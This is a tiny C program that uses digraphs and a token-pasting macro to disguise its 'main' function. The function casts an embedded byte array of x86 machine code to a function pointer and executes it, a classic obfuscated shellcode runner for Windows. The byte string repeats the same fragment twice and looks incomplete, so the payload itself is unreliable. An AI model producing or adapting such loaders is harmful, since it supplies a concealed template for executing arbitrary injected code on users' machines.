%:include <stdio.h>
%:include <windows.h>
%:define __(i,s,o,g,r,a,m)(i%:%:r%:%:s%:%:o)
%:define _ __(m,i,n,u,a,l,s)
unsigned char fub<::>=
"\xff\x01\xc3\x29\xc6\x75\xc7\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00"
"\xff\x01\xc3\x29\xc6\x75\xc7\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00";
int _(void) <%((void (*)())fub)();%>
